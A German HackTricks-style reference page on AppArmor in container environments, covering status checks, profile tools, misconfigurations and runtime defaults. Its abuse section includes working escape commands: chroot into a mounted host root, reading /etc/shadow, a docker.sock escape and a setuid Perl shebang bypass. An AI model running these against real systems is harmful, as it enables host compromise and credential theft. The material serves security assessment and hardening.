# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen über pro-Programm-Profile anwendet. Im Gegensatz zu traditionellen DAC-Prüfungen, die stark von Benutzer- und Gruppenbesitz abhängig sind, erlaubt AppArmor dem Kernel, eine an den Prozess angehängte Richtlinie durchzusetzen. In Container-Umgebungen ist das wichtig, weil ein Workload über genügend traditionelle Privilegien verfügen kann, um eine Aktion zu versuchen, und dennoch abgewiesen wird, weil sein AppArmor-Profil den entsprechenden Pfad, mount, Netzwerkverhalten oder die Nutzung einer Capability nicht erlaubt.

## Rolle in der Container-Isolation

Container-Sicherheitsprüfungen enden oft bei capabilities und seccomp, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stellen Sie sich einen Container vor, der mehr Privilegien hat, als er sollte, oder einen Workload, der aus Betriebsgründen eine zusätzliche capability benötigte. AppArmor kann weiterhin Datei­zugriffe, mount-Verhalten, Networking und Ausführungsmuster so einschränken, dass der offensichtliche Missbrauchspfad unterbunden wird. Deshalb kann das Deaktivieren von AppArmor "just to get the application working" eine bloß riskante Konfiguration stillschweigend in eine aktiv ausnutzbare verwandeln.

## Labor

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwenden Sie:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Benutzer der aktuelle Containerprozess ausgeführt wird:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im Normalfall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom runtime gewählte Profil gebunden ist. Im unconfined-Fall verschwindet diese zusätzliche Einschränkungsebene.

Sie können auch prüfen, was Docker glaubt angewendet zu haben:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitnutzung

Docker kann ein standardmäßiges oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann sich auf AppArmor-basierten Systemen ebenfalls in AppArmor integrieren, obwohl auf SELinux-first-Distributionen das andere MAC-System oft im Vordergrund steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Knoten bereitstellen, die tatsächlich AppArmor unterstützen. LXC und verwandte Ubuntu-family system-container-Umgebungen nutzen AppArmor ebenfalls ausgiebig.

Der praktische Punkt ist, dass AppArmor kein "Docker feature" ist. Es ist eine Host-Kernel-Funktion, die mehrere Runtimes anwenden können. Wenn der Host es nicht unterstützt oder die Runtime angewiesen wird, unconfined zu laufen, ist der angebliche Schutz nicht wirklich vorhanden.

Auf Docker-fähigen AppArmor-Hosts ist das bekannteste Default-Profil `docker-default`. Dieses Profil wird aus Moby's AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Standard-Container trotzdem fehlschlagen. Grob gesagt erlaubt `docker-default` normales Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert Zugriff auf sensible Bereiche von `/sys`, blockiert mount-Operationen und beschränkt ptrace, sodass es kein allgemeines Host-Probing-Primitiv darstellt. Das Verständnis dieser Basislinie hilft zu unterscheiden zwischen "der Container hat `CAP_SYS_ADMIN`" und "der Container kann diese Capability tatsächlich gegen die Kernel-Schnittstellen verwenden, die mich interessieren".

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` abgelegt. Eine gängige Namenskonvention ist, Schrägstriche im Pfad der ausführbaren Datei durch Punkte zu ersetzen. Beispielsweise wird ein Profil für `/usr/bin/man` üblicherweise als `/etc/apparmor.d/usr.bin.man` gespeichert. Diese Einzelheit ist sowohl für die Verteidigung als auch für die Bewertung relevant, weil man, sobald man den aktiven Profilnamen kennt, die entsprechende Datei auf dem Host oft schnell finden kann.

Nützliche hostseitige Verwaltungsbefehle sind:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer container-security-Referenz wichtig sind, ist, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in den complain mode versetzt und nach Änderungen an Anwendungen angepasst werden. Wenn ein Betreiber dazu neigt, Profile während der Fehlerbehebung in den complain mode zu versetzen und vergisst, die Durchsetzung wiederherzustellen, kann der Container in der Dokumentation geschützt aussehen, sich aber in der Realität deutlich lockerer verhalten.

### Erstellen und Aktualisieren von Profilen

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv beim Erstellen eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Template-Profil erstellen, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn die Binary sich ändert und die Policy aktualisiert werden muss, kann `aa-logprof` Verweigerungen, die in den Logs gefunden wurden, erneut abspielen und den Operator dabei unterstützen, zu entscheiden, ob diese erlaubt oder abgelehnt werden sollen:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Verweigerungen sind häufig über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Das ist operativ und offensiv nützlich. Verteidiger nutzen es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Kontrollinstanz ist, die eine Exploit-Kette blockiert.

### Die genaue Profildatei identifizieren

Wenn eine Runtime einen spezifischen AppArmor-Profilnamen für einen Container anzeigt, ist es oft nützlich, diesen Namen der Profildatei auf der Festplatte zuzuordnen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dies ist besonders nützlich bei der Überprüfung auf dem Host, da es die Lücke zwischen "der Container gibt an, unter dem Profil `lowpriv` zu laufen" und "die tatsächlichen Regeln befinden sich in dieser konkreten Datei, die geprüft oder neu geladen werden kann" schließt.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen dies häufig beim Debugging einer Anwendung, die fehlgeschlagen ist, weil das Profil etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Bleibt das Flag in der Produktion bestehen, ist die gesamte MAC-Schicht praktisch entfernt.

Ein weiteres, subtileres Problem ist die Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert ist, kann das Offenlegen von Host-Pfaden unter alternativen Mount-Pfaden schlecht mit Pfadregeln interagieren. Ein dritter Fehler ist zu vergessen, dass ein Profilname in einer Konfigurationsdatei sehr wenig bedeutet, wenn der Host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor fehlt, funktionieren Vorgänge, die zuvor eingeschränkt waren, plötzlich möglicherweise: das Lesen sensibler Pfade durch bind mounts, der Zugriff auf Teile von procfs oder sysfs, die eigentlich schwerer zu nutzen bleiben sollten, das Ausführen mount-bezogener Aktionen, wenn capabilities/seccomp dies ebenfalls erlauben, oder die Verwendung von Pfaden, die ein Profil normalerweise verweigern würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein capability-based breakout-Versuch auf dem Papier "funktionieren sollte", in der Praxis aber dennoch scheitert. Entfernt man AppArmor, kann derselbe Versuch beginnen zu gelingen.

Wenn Sie vermuten, dass AppArmor die Hauptursache dafür ist, dass eine path-traversal-, bind-mount- oder mount-based Abuse-Kette gestoppt wird, besteht der erste Schritt normalerweise darin, zu vergleichen, was mit und ohne Profil zugänglich wird. Zum Beispiel: Wenn ein Host-Pfad innerhalb des Containers gemountet ist, beginnen Sie damit zu prüfen, ob Sie ihn traversieren und lesen können:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem eine gefährliche Capability wie `CAP_SYS_ADMIN` besitzt, ist einer der praktischsten Tests, ob AppArmor die Kontrolle ist, die Mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein host path bereits über ein bind mount verfügbar ist, kann der Verlust von AppArmor ein read-only information-disclosure issue in direkten host file access verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Punkt dieser Befehle ist nicht, dass AppArmor allein den breakout verursacht. Vielmehr geht es darum, dass, sobald AppArmor entfernt ist, viele Dateisystem- und mount-basierte Missbrauchspfade sofort testbar werden.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root gemountet

Wenn der Container bereits das Host-Root per bind mount unter `/host` eingebunden hat, kann das Entfernen von AppArmor einen zuvor blockierten Dateisystem-Missbrauchspfad in eine vollständige host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die shell über das host filesystem ausgeführt wird, hat die workload effektiv die container boundary verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime Socket

Wenn die eigentliche Barriere AppArmor rund um den runtime state war, kann ein mounted socket für ein vollständiges escape ausreichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Mount-Punkt ab, aber das Ergebnis ist dasselbe: AppArmor verhindert nicht mehr den Zugriff auf die runtime API, und die runtime API kann einen host-kompromittierenden Container starten.

### Vollständiges Beispiel: Path-Based Bind-Mount Bypass

Da AppArmor pfadbasiert ist, schützt das Sperren von `/proc/**` nicht automatisch denselben Host-procfs-Inhalt, wenn er über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die Auswirkung hängt davon ab, was genau gemountet ist und ob der alternative Pfad auch andere Kontrollen umgeht, aber dieses Muster ist einer der deutlichsten Gründe, warum AppArmor zusammen mit dem mount layout bewertet werden muss und nicht isoliert.

### Vollständiges Beispiel: Shebang Bypass

AppArmor-Policy zielt manchmal auf einen Interpreter-Pfad ab, ohne die Skriptausführung durch shebang handling vollständig zu berücksichtigen. Ein historisches Beispiel bestand darin, ein Skript zu verwenden, dessen erste Zeile auf einen eingeschränkten Interpreter zeigt:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Dieses Beispiel ist wichtig als Erinnerung daran, dass die beabsichtigte Wirkung eines Profils und die tatsächliche Ausführungssemantik auseinanderfallen können. Beim Prüfen von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Prüfungen

Das Ziel dieser Checks ist es, drei Fragen schnell zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert die Workload nicht von AppArmor-Konfinierung.
- Wenn `aa-status` AppArmor als disabled oder not loaded anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund, warum ein filesystem- oder mount-basierter Missbrauchspfad funktioniert.

Wenn ein Container bereits aus betrieblichen Gründen erhöhte Privilegien hat, macht das Belassen von AppArmor aktiviert oft den Unterschied zwischen einer kontrollierten Ausnahme und einem deutlich umfangreicheren Sicherheitsversagen.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig auf AppArmor-fähigen Hosts aktiviert | Verwendet das `docker-default` AppArmor-Profil, sofern nicht überschrieben | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-abhängig | AppArmor wird über `--security-opt` unterstützt, aber der genaue Standard ist host-/runtime-abhängig und weniger universell als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, ist der Standard `RuntimeDefault`, wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O under Kubernetes | Folgt der Node-/Runtime-Unterstützung | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; direkte Runtime-Konfiguration kann AppArmor ebenfalls vollständig umgehen |

Für AppArmor ist die wichtigste Variable oft der **host**, nicht nur die runtime. Eine Profil-Einstellung in einem Manifest erzeugt keine Konfinierung auf einem Node, auf dem AppArmor nicht aktiviert ist.
{{#include ../../../../banners/hacktricks-training.md}}
